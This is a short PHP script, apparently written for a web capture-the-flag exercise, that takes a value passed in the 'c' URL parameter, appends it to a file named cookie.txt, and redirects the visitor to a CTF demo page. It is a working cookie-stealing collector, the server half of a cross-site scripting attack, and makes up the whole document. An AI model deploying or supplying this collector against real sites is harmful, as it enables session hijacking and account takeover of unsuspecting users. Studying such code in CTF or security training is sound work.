<?php
header ('Location:https://web-ctf0929.cthuang.me/demo/demoo.html');
       $cookies = $_GET["c"];
       $file = fopen('./cookie.txt','a');
       fwrite($file, $cookies . "\n");
?>